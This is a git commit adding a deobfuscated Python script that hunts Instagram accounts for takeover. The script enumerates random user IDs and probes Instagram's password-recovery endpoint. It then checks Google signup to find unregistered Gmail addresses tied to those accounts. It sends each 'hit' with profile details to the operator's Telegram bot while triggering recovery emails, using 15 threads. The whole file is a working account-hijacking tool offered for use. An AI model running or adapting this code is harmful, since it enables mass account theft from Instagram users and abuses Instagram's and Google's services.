114e1cb2db4b0e046970ad4e3641d0a347c704f1
ehh41916-cyber <ehh41916@gmail.com>
2026-01-09 23:05:49 +0300

    Add files via upload

---
+++ In.py
@@ -0,0 +1,499 @@
+# تـم فك من اراس • @W4_M4
+#قـنـاة المفكك • @pytho2n
+import webbrowser
+webbrowser.open('https://t.me/pytho2n')
+import os
+import requests
+import time
+import re
+import random
+import string
+import json
+from random import choice as cc, randint as rr
+from uuid import uuid4 as gg
+from uuid import uuid4
+from random import choice,randrange
+from user_agent import generate_user_agent
+import threading
+
+Z = '\x1b[1m\x1b[32m'
+Y = '\x1b[1m\x1b[33m'
+R = '\x1b[1m\x1b[31m'
+W = '\x1b[1m\x1b[37m'
+C = '\x1b[1m\x1b[36m'
+X = '\x1b[0m'
+P='\x1b[38;5;231m'
+J='\x1b[38;5;208m'
+J1='\x1b[38;5;202m'
+J2='\x1b[38;5;203m'
+J21='\x1b[38;5;204m'
+J22='\x1b[38;5;209m'
+F1='\x1b[38;5;76m'
+C1='\x1b[38;5;120m'
+P1='\x1b[38;5;150m'
+P2='\x1b[38;5;190m'
+BR = '\x1b[38;5;208m'
+AH2 = '\x1b[38;5;204m' 
+AS2 = '\x1b[38;5;220m'
+MJ = '\x1b[38;5;193m'
+MJ2 = '\x1b[38;5;216m'
+MJ3 = '\x1b[38;5;190m'
+MJ4 = '\x1b[38;5;106m'
+ma = '\x1b[38;5;26m'
+c1 = '\x1b[38;5;120m'
+j21 = '\x1b[38;5;204m'
+p1 = '\x1b[38;5;150m'
+cyan = "\033[1m\033[36m"
+x = '\x1b[1;33m'
+white = '\x1b[1;37m'
+z = '\x1b[1;31m'
+bi = random.randint(5,208)
+ror1 = f'\x1b[38;5;{bi}m'
+memo = random.randint(100, 300)
+ror = f'\x1b[38;5;{memo}m'
+P = '\x1b[38;5;231m'
+J = '\x1b[38;5;208m'
+J1 = '\x1b[38;5;202m'
+J2 = '\x1b[38;5;203m'
+J21 = '\x1b[38;5;204m'
+J22 = '\x1b[38;5;209m'
+F1 = '\x1b[38;5;76m'
+C1 = '\x1b[38;5;120m'
+P1 = '\x1b[38;5;150m'
+P2 = '\x1b[38;5;190m'
+BR = '\x1b[38;5;208m'
+AH2 = '\x1b[38;5;204m'
+AS2 = '\x1b[38;5;220m'
+MJ = '\x1b[38;5;193m'
+MJ2 = '\x1b[38;5;216m'
+MJ3 = '\x1b[38;5;190m'
+MJ4 = '\x1b[38;5;106m'
+ma = '\x1b[38;5;26m'
+E = '\033[1;31m'
+Y = '\033[1;33m'
+Z = '\033[1;31m'  # احمر
+X = '\033[1;33m'  # اصفر
+Z1 = '\033[2;31m'  # احمر ثاني
+F = '\033[2;32m'  # اخضر
+A = '\033[2;34m'  
+C = '\033[2;35m'  # وردي
+S = '\033[2;36m'  # سمائي
+G = '\033[1;34m'  # ازرق فاتح
+HH = '\033[1;34m'  # ازرق فاتح
+M = '\x1b[1;37m'  # ابيض
+Y = "\033[1;33m"  # Yellow
+R = '\033[1;31m'  # احمر
+X = '\033[1;33m'  
+F = '\033[2;31m'  # اخضر
+C = "\033[1;97m"  # ابيض
+B = '\033[2;36m'  # سمائي
+E = '\033[1;31m'
+W9 = "\033[1m\033[34m"
+M = '\x1b[1;37m'
+HH = '\033[1;34m'
+R = '\033[1;31;40m'
+F = '\033[1;32;40m'
+C = "\033[1;97;40m"
+B = '\033[1;36;40m'
+C1 = '\x1b[38;5;120m'
+P1 = '\x1b[38;5;150m'
+P2 = '\x1b[38;5;190m'
+E = '\033[1;31m'
+Y = '\033[1;33m'
+Z = '\033[1;31m'
+X = '\033[1;33m'
+Z1 = '\033[2;31m'
+F = '\033[2;32m'
+A = '\033[2;34m'
+C = '\033[2;35m'
+S = '\033[2;36m'
+red = "\033[1m\033[31m"
+green = "\033[1m\033[32m"
+yellow = "\033[1m\033[33m"
+blue = "\033[1m\033[34m"
+cyan = "\033[1m\033[36m"
+magenta = "\033[1m\033[35m"
+M = "\033[1m\033[36m"
+white = "\033[1m\033[37m"
+orange = "\033[1m\033[38;5;208m"
+reset = "\033[0m"
+a1 = '\x1b[1;31m'  # أح.مر
+a2 = '\x1b[1;34m'  # أزرق
+a3 = '\x1b[1;32m'  # أخضر
+a4 = '\x1b[1;33m'  # أصفر
+a5 = '\x1b[38;5;208m'  # برتقالي
+a6 = '\x1b[38;5;5m'  # أرجواني
+a7 = '\x1b[38;5;13m'  # وردي
+a8 = '\x1b[1;30m'  # أسود
+a9 = '\x1b[1;37m'  # أبيض
+a10 = '\x1b[38;5;52m'  # بني
+a11 = '\x1b[38;5;8m'  # رمادي
+a12 = '\x1b[38;5;220m'  # ذهبي
+a13 = '\x1b[38;5;7m'  # فضي
+a14 = '\x1b[38;5;153m'  # أز.رق فاتح
+a15 = '\x1b[38;5;18m'  # أزرق داكن
+a16 = '\x1b[38;5;48m'  # أخضر فاتح
+a17 = '\x1b[38;5;22m'  # أخض.ر داكن
+a18 = '\x1b[38;5;196m'  # أحمر فاتح
+a19 = '\x1b[38;5;88m'  # أحمر داكن
+a20 = '\x1b[38;5;226m'  # أ.صفر فاتح
+a21 = '\x1b[38;5;136m'  # أصفر داكن
+a22 = '\x1b[38;5;216m'  # برتقالي فات
+a23 = '\x1b[38;5;166m'  # برتقالي داكن
+a24 = '\x1b[38;5;234m'  # أرجواني فاتح
+a25 = '\x1b[38;5;91m'  # أرجواني داكن
+a26 = '\x1b[38;5;205m'  # وردي فاتح
+a27 = '\x1b[38;5;161m'  # وردي داكن
+a28 = '\x1b[38;5;236m'  # أسود فاتح
+a29 = '\x1b[38;5;233m'  # أسود داكن
+a30 = '\x1b[38;5;255m'  # أبيض فاتح
+a31 = '\x1b[38;5;231m'  # أبيض داكن
+a32 = '\x1b[38;5;180m'  # بني فاتح
+a33 = '\x1b[38;5;94m'  # بني داكن
+a34 = '\x1b[38;5;252m'  # رمادي فاتح
+a35 = '\x1b[38;5;246m'  # رمادي داكن
+a36 = '\x1b[38;5;228m'  # ذهبي فاتح
+a37 = '\x1b[38;5;172m'  # ذهبي داكن
+a38 = '\x1b[38;5;188m'  # فضي فاتح
+a39 = '\x1b[38;5;247m'  # فضي داكن
+a40 = '\x1b[38;5;117m'  # أزرق سماوي
+gg = '\x1b[38;5;208m'
+X = '\033[1;33m'
+J22 = '\x1b[38;5;209m'
+J21 = '\x1b[38;5;204m'
+J2 = '\x1b[38;5;203m'
+J1 = '\x1b[38;5;202m'
+E = '\033[1;31m'
+W2 = '\x1b[38;5;120m'
+W3 = '\x1b[38;5;204m'
+W4 = '\x1b[38;5;150m'
+W5 = '\x1b[1;33m'
+W6 = '\x1b[1;31m'
+W7 = "\033[1;33m"
+W8 = '\x1b[2;36m'
+W8 = f'\x1b[38;5;117m'
+W9 = "\033[1m\033[34m"
+P = '\x1b[1;97m'
+B = '\x1b[1;94m'
+O = '\x1b[1;96m'
+Z = '\x1b[1;30m'
+X = '\x1b[1;33m'
+F = '\x1b[2;32m'
+Z = '\x1b[1;31m'
+L = '\x1b[1;95m'
+C = '\x1b[2;35m'
+A = '\x1b[2;39m'
+P = '\x1b[38;5;231m'
+J = '\x1b[38;5;208m'
+J1 = '\x1b[38;5;202m'
+J2 = '\x1b[38;5;203m'
+J21 = '\x1b[38;5;204m'
+J22 = '\x1b[38;5;209m'
+F1 = '\x1b[38;5;76m'
+C1 = '\x1b[38;5;120m'
+P1 = '\x1b[38;5;150m'
+P2 = '\x1b[38;5;190m'
+E = '\033[1;31m'
+Y = '\033[1;33m'
+Z = '\033[1;31m'
+X = '\033[1;33m'
+Z1 = '\033[2;31m'
+F = '\033[2;32m'
+A = '\033[2;34m'
+C = '\x1b[2;35m'
+S = '\x1b[2;36m'
+G = '\033[1;34m'
+HH = '\033[1;34m'
+red = "\033[1m\033[31m"
+green = "\033[1m\033[32m"
+yellow = "\033[1m\033[33m"
+blue = "\033[1m\033[34m"
+cyan = "\033[1m\033[36m"
+magenta = "\033[1m\033[35m"
+M = "\033[1m\033[36m"
+white = "\033[1m\033[37m"
+orange = "\033[1m\033[38;5;208m"
+reset = "\033[0m"
+O = '\x1b[38;5;208m'
+Y = '\033[1;34m'
+C = '\033[2;35m'
+M = '\x1b[1;37m'
+pink_t5ok5 = '\x1b[38;5;199m'
+WHITE_BOLD = '\x1b[1;97m'
+reset = '\x1b[0m'
+HH = random.choice([a1, a2, a3, a4, a5, a14, a18, a20, a21, a22, a23, a26, a27, a37, a38, a40 ,Y ,C,M,pink_t5ok5])
+lock = threading.Lock()
+def W4_M4():
+    print(f"""                                 	
+       █████╗      ██████╗       █████╗      ███████╗
+      ██╔══██╗     ██╔══██╗     ██╔══██╗     ██╔════╝
+      ███████║     ██████╔╝     ███████║     ███████╗
+      ██╔══██║     ██╔══██╗     ██╔══██║     ╚════██║
+      ██║  ██║     ██║  ██║     ██║  ██║     ███████║
+      ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚══════╝
+
+            {a26}.•´¯`•.¸¸ {F} INSTA {a36}¸.•´¯`•.¸¸              
+{a16}            
+• تم فك من اراس : @W4_M4
+• قناة المفكك : @pytho2n 
+                     
+""")
+
+W4_M4()
+token = input("\x1b[1;32m𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐁𝐨𝐭 𝐓𝐨𝐤𝐞𝐧 : \x1b[1;33m")
+id = input("\x1b[1;32m𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐈𝐝 : \x1b[1;33m")
+webbrowser.open('https://t.me/pytho2n')
+time.sleep(1.5)
+os.system("clear")
+hit_ig = 0
+iyi_ig = 0
+bad_ig = 0
+bad_gm = 0
+checked_users = []
+def list_cek():
+    while True:
+        user_id=str(random.randrange(1,21254029834))
+        csrf_token = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(32))
+        datr = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(16))
+        session_id = f"{user_id}%3A{''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(10))}%3A28%3A{''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(24))}"
+        cookies = {
+        'datr': datr,
+        'csrftoken': csrf_token,
+        'ds_user_id': user_id,
+        'sessionid': session_id
+        }
+        headers = {
+        'authority': 'www.instagram.com',
+        'accept': '*/*',
+        'accept-language': 'en-US,en;q=0.9',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://www.instagram.com',
+        'referer': 'https://www.instagram.com/explore/search/',
+        'user-agent': generate_user_agent(),
+        'x-csrftoken': csrf_token,
+        'x-ig-app-id': '1217981644879628',
+        }
+        data = {
+        'variables': json.dumps({"id": user_id, "render_surface": "PROFILE"}),
+        'doc_id': '9383802848352200',
+        }
+        try:
+            response = requests.post('https://www.instagram.com/graphql/query', cookies=cookies, headers=headers, data=data)
+            username = response.json()['data']['user']['username']
+            email = username
+            follower = response.json()["data"]["user"]["follower_count"]
+            if "username" in response.text:
+                return email            
+        except Exception as e:
+            pass#print(e)
+def date(Id):
+ try:
+  if int(Id) >1 and int(Id)<1279000:
+   return 2010
+  elif int(Id)>1279001 and int(Id)<17750000:
+   return 2011
+  elif int(Id) > 17750001 and int(Id)<279760000:
+   return 2012
+  elif int(Id)>279760001 and int(Id)<900990000:
+   return 2013
+  elif int(Id)>900990001 and int(Id)< 1629010000:
+   return 2014
+  elif int(Id)>1900000000 and int(Id)<2500000000:
+   return 2015
+  elif int(Id)>2500000000 and int(Id)<3713668786:
+   return 2016
+  elif int(Id)>3713668786 and int(Id)<5699785217:
+   return 2017
+  elif int(Id)>5699785217 and int(Id)<8507940634:
+   return 2018
+  elif int(Id)>8507940634 and int(Id)<21254029834:
+   return 2019
+  else:
+   return "2020-2023"
+ except BaseException as Wizard :
+  return Wizard
+def info(email):
+    username = email.split("@")[0]
+    rest_headers = {
+        'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
+        'X-Pigeon-Rawclienttime': '1700251574.982',
+        'X-IG-Connection-Speed': '-1kbps',
+        'X-IG-Bandwidth-Speed-KBPS': '-1.000',
+        'X-IG-Bandwidth-TotalBytes-B': '0',
+        'X-IG-Bandwidth-TotalTime-MS': '0',
+        'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
+        'X-IG-Connection-Type': 'WIFI',
+        'X-IG-Capabilities': '3brTvw==',
+        'X-IG-App-ID': '567067343352427',
+        'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
+        'Accept-Language': 'en-GB, en-US',
+        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'Accept-Encoding': 'gzip, deflate',
+        'Host': 'i.instagram.com',
+        'X-FB-HTTP-Engine': 'Liger',
+        'Connection': 'keep-alive',
+        'Content-Length': '356',
+    }
+    rest_data = {
+        'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+username+'"}',
+        'ig_sig_key_version': '4',
+    }
+    reset = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=rest_headers, data=rest_data).json()["email"]
+    try:
+        cookies = {
+            'cf_clearance': 'N0OZI7JbDfiBKN7iTlXpDw3RYxSMov80KhBHnRAOMSc-1745488156-1.2.1.1-.uOKKFMFwG3lW8Tthn_MJsv.M31PawzYv0Ix.zbM9CyysWGshYuhRm13rRqgIu6pp_5jh6Y9AOt7ao6gVGhLkaNF6XrG4CvKoLX6Oky16jAFib41mHbX0J..I.S5FVEwqzDch3vc8EF4ZC9sjXffTVYVxGblTKuzrBIOwHVH.p8ZTtpws_9jSCSHunGPdsGzYtMj4O0_vt7hXhhcAMMaVJTpATIcqMkX6h6PdxWo.OaKbEo1TENeGS2NVOm5Z8g5XwurwSynXb5UWr1_DDEEw1XOx5iJl8emEydcteCtaqzN9mleBjLiL5xLUMJwWXjz7FHQUejyNEDMrQWq6KEDCU9DPlZONCu96pbZgHg4m5J1xs0B7CNJQ8pEaTMDxwzP',
+        }
+        headers = {
+            'authority': 'storyviewer.com',
+            'accept': 'application/json, text/plain, */*',
+            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/json',
+            'origin': 'https://storyviewer.com',
+            'referer': 'https://storyviewer.com/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-arch': '""',
+            'sec-ch-ua-bitness': '""',
+            'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"14.0.0"',
+            'sec-ch-ua-full-version': '"137.0.7337.0"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        }
+        json_data = {
+            'username': username,
+        }
+        r = requests.post('https://storyviewer.com/api/data', cookies=cookies, headers=headers, json=json_data).json()
+        takipci = r['user_info']['followers']
+        tam_isim = r['user_info']['full_name']
+        user_idd = r['user_info']['id']
+        takip_edilen = r['user_info']['following']
+        post = r['user_info']['posts']        
+        text = f'''
+𝐴𝐶𝐶𝑂𝑈𝑁𝑇 𝐼𝑁𝑆𝑇𝐴𝐺𝑅𝐴𝑀
+──────────────────────
+❄️𝐇𝐈𝐓 : {hit_ig}
+❄️𝐈𝐒𝐈𝐌 : {tam_isim}
+❄️𝐊𝐔𝐋𝐋𝐀𝐍𝐈𝐂𝐈 𝐀𝐃𝐈 : @{username}
+❄️𝐄𝐌𝐀𝐈𝐋 : {email}
+❄️𝐓𝐀𝐊𝐈̇𝐏𝐂̧𝐈̇ : {takipci}
+❄️𝐓𝐀𝐊𝐈̇𝐏 : {takip_edilen}
+❄️𝐈𝐃 : {user_idd}
+❄️𝐊𝐔𝐑𝐔𝐋𝐔𝐌 : {date(r["id2"])}
+❄️𝐏𝐎𝐒𝐓 : {post}
+❄️𝐑𝐄𝐒𝐄𝐓: {reset}
+──────────────────────
+• تم فك من اراس : @W4_M4
+• قناة المفكك : @pytho2n'''        
+        with lock:
+            with open("hitarasDec.txt", "a") as kaydet:
+                kaydet.write(text + "\n")
+        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={text}")        
+    except Exception as wizoo:
+        text = f'''
+𝐴𝐶𝐶𝑂𝑈𝑁𝑇 𝐼𝑁𝑆𝑇𝐴𝐺𝑅𝐴𝑀
+──────────────────────
+❄️𝐇𝐈𝐓 : {hit_ig}
+❄️𝐊𝐔𝐋𝐋𝐀𝐍𝐈𝐂𝐈 𝐀𝐃𝐈 : @{username}
+❄️𝐄𝐌𝐀𝐈𝐋 : {email}
+❄️𝐑𝐄𝐒𝐄𝐓: {reset}
+──────────────────────
+• تم فك من اراس : @W4_M4
+• قناة المفكك : @pytho2n'''        
+        with lock:
+            with open("hit_wizard.txt", "a") as kaydet:
+                kaydet.write(text + "\n")
+        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={text}")
+def check_ig(email):
+	cookies = {
+	'csrftoken':'X2my0jz_gM8Fx0AFuTnDUA',
+	'dpr':'2.75',
+	'datr':'izhAZ-wDTHDpFTMZgOD8qLjH',
+	'ig_did':'55A1ED1E-32F8-4AE3-9938-7C60526941D6',
+	'mid':'Z0A4iwABAAHexmqymQnKLZLEn6A7',
+	'wd':'393x767'
+	}
+	headers = {
+	'content-type':'application/x-www-form-urlencoded',
+	'origin':'https://www.instagram.com',
+	'referer':'https://www.instagram.com/accounts/password/reset/?source=fxcal',
+	'user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	'x-csrftoken':'X2my0jz_gM8Fx0AFuTnDUA'
+	}
+	data = {
+	'email_or_username':email,
+	'flow':'fxcal'
+	}
+	response = requests.post('https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/', data=data, headers=headers, cookies=cookies)
+	if '"email_or_sms_sent":true' in response.text:
+		return True
+	else:
+		return False
+def check_gm(email):
+	try:
+		n1=''.join(cc('azertyuiopmlkjhgfdsqwxcvbn')for _ in range(rr(6,9)))
+		n2=''.join(cc('azertyuiopmlkjhgfdsqwxcvbn')for _ in range(rr(3,9)))
+		host=''.join(cc('azertyuiopmlkjhgfdsqwxcvbn')for _ in range(rr(15,30)))
+		headers_init={"accept":"*/*","accept-language":"ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6","content-type":"application/x-www-form-urlencoded;charset=UTF-8","google-accounts-xsrf":"1","sec-ch-ua":"\"Not)A;Brand\";v=\"24\",\"Chromium\";v=\"116\"","sec-ch-ua-mobile":"?1","sec-ch-ua-platform":"\"Android\"","user-agent":str(gg())}
+		res1=requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',headers=headers_init)
+		tok=re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',res1.text).group(2)
+		cookies={'__Host-GAPS':host}
+		headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp','user-agent':str(gg())}
+		data={'f.req':'["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]','deviceinfo':'[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'}
+		response=requests.post('https://accounts.google.com/_/signup/validatepersonaldetails',cookies=cookies,headers=headers,data=data)
+		tl=str(response.text).split('",null,"')[1].split('"')[0]
+		host=response.cookies.get_dict()['__Host-GAPS']
+		if'@'in email:email=str(email).split('@')[0]
+		cookies={'__Host-GAPS':host}
+		headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,'user-agent':str(gg())}
+		params={'TL':tl}
+		data=('continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&')
+		response=requests.post('https://accounts.google.com/_/signup/usernameavailability',params=params,cookies=cookies,headers=headers,data=data)
+		if '"gf.uar",1'in response.text:
+			return True
+		elif '"gf.uar",2'in response.text or '"gf.uar",3' in response.text:
+			return False
+		else:
+			return False
+	except:
+		return False
+def arayuz(email):
+	os.system("clear")
+	
+	print(f'''\x1b[1;32m✅ 𝐇𝐈𝐓 𝐈𝐍𝐒𝐓𝐀: [ {hit_ig} ]    \n\x1b[1;33m🟨 𝐈𝐘𝐈 𝐈𝐍𝐒𝐓𝐀: [ {iyi_ig} ]    \n\x1b[1;31m❌ 𝐊𝐎𝐓𝐔 𝐈𝐍𝐒𝐓𝐀: [ {bad_ig} ]    \n\x1b[1;31m❌ 𝐊𝐎𝐓𝐔 𝐆𝐌𝐀𝐈𝐋: [ {bad_gm} ]    \n\033[1;36m📥 𝐄𝐌𝐀𝐈𝐋: [ {email} ]   
+	{a20}
+	• تم فك من اراس : @W4_M4
+• قناة المفكك : @pytho2n ''')
+	
+def aras():
+    global hit_ig, iyi_ig, bad_ig, bad_gm
+    while True:
+        try:
+            username = list_cek()            
+            if username in checked_users:
+                continue
+            checked_users.append(username)     
+            email = username + "@gmail.com"
+            chk_ig = check_ig(email)           
+            if chk_ig:
+                iyi_ig += 1
+                arayuz(email)                
+                chk_gm = check_gm(email)
+                if chk_gm:
+                    hit_ig += 1
+                    info(email)
+                    arayuz(email)
+                else:
+                    bad_gm += 1
+                    arayuz(email)
+            else:
+                bad_ig += 1
+                arayuz(email)                
+        except Exception as wizardd:
+            pass
+for WIZARD in range(15):
+    threading.Thread(target=aras).start()
